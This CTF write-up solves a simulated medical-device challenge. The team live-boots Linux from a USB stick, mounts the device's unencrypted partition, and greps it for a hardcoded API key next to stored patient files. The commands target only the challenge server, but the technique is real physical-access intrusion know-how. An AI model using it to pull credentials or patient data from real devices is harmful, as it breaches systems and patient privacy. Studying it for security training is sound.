---
title: Live Boot
tags:
  - DEADFACE CTF 2026
  - Medical Device
  - Linux
---

# Live Boot

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Medical Device |
| **Points** | 50 |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

DEADFACE got a live shell on the device, though staff insist the OS is unreachable. They used keys that aren't in the Field Manual. Access the device's file system and find the hardcoded keys.

## Solution

### Booting the Live Linux USB

The USB-A hotspot says the port "accepts maintenance media and peripherals; not disabled in the field configuration". Plug in the Live Linux USB and you get a terminal:

```bash
curl -s -X POST http://emedra.dctf.io:8080/api/connect \
  -H 'content-type: application/json' -d '{"tool":"live-linux","port":"usb-a"}'
# then: POST /api/shell {"token":"<TOKEN>","line":"<command>"}
```

`help` lists a small busybox-style set: `ls cd pwd cat echo printf head tail wc file strings find grep cp sed lsblk mount sudo whoami id uname hostname env base64 sha256sum md5sum xxd scanctl`.

### Mounting the real disk

The live system's root is an empty overlay (`/cow on / type overlay`), so there's nothing there. `lsblk` shows the device's own disk:

```
NAME   SIZE FSTYPE LABEL          MOUNTPOINT
sda     32G
|-sda1 512M vfat                  /boot/efi
`-sda2  31G ext4   scanworks-data
```

The data partition isn't encrypted, just not mounted:

```
sudo mount /dev/sda2 /mnt
find /mnt
```

```
/mnt/opt/scanworks/calibration/{README,calib.json,calib.json.sig,verify.py}
/mnt/opt/scanworks/config.yaml
/mnt/opt/scanworks/logs/scanworks.log
/mnt/opt/scanworks/scanworks.bin
/mnt/var/scanworks/patients/{100228,100413,100666}.dcm
```

### The key

```
grep -r deadface /mnt
```

```yaml
# /mnt/opt/scanworks/config.yaml
# Upstream API key (service account). TODO: move to secrets store before GA.
api_key: deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}
```

Hang on to this `config.yaml`. It also has the calibration salt for [Bad Calibration](bad-calibration.md) and the debug console names for [Dump It](dump-it.md).

## Flag

!!! flag "Flag"
    `deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}`

## Takeaways

An open USB port and a live-boot stick give you the whole disk if it isn't encrypted. If the live root looks empty, run `lsblk` and mount the device's own partitions.
